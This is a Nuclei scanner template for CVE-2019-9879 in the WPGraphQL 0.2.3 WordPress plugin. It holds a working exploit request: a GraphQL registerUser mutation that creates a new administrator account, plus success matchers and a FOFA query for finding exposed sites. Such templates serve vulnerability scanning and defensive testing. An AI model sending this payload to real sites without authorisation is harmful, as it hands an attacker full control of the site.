http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, 'application/json')
    - contains_all(body, 'UWHATM8', '{\"status\":')
    type: dsl
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-type: application/json


    {"query": "mutation{registerUser(input:{clientMutationId:\"UWHATM8\",email:\"{{user_email}}\",password:\"{{password}}\",username:\"{{username}}\",roles:[\"administrator\"]}){clientMutationId}}"}

    '
id: CVE-2019-9879
info:
  author: DhiyaneshDk
  classification:
    cpe: cpe:2.3:a:wpengine:wpgraphql:0.2.3:*:*:*:*:wordpress:*:*
    cve-id: CVE-2019-9879
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-306
    epss-percentile: 0.98938
    epss-score: 0.77634
  description: 'The WPGraphQL 0.2.3 plugin for WordPress allows remote attackers to
    register a new user with admin privileges, whenever new user registrations are
    allowed. This is related to the registerUser mutation.

    '
  impact: 'Attackers can create admin users, leading to full control over the WordPress
    site.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/wp-graphql/"
    framework: wordpress
    max-request: 1
    product: wpgraphql
    vendor: wpengine
  name: WPGraphQL 0.2.3 - User Creation
  reference:
  - https://github.com/wp-graphql/wp-graphql/releases/tag/v0.3.0
  - https://github.com/pentestpartners/snippets/blob/master/wp-graphql0.2.3_exploit.py
  - https://wpscan.com/vulnerability/2d451c89-91ce-4151-b3fb-56af15869644/
  - https://nvd.nist.gov/vuln/detail/CVE-2019-9879
  remediation: 'Update to the latest version of WPGraphQL or apply security patches
    to restrict user registration permissions.

    '
  severity: critical
  tags: cve,cve2019,wp-graphql,wpengine,wordpress,wp-plugin,intrusive,vkev,vuln
variables:
  password: '{{rand_text_alphanumeric(12)}}'
  user_email: '{{username}}@{{to_lower(rand_text_alphanumeric(6))}}.com'
  username: '{{to_lower(rand_text_alphanumeric(6))}}'
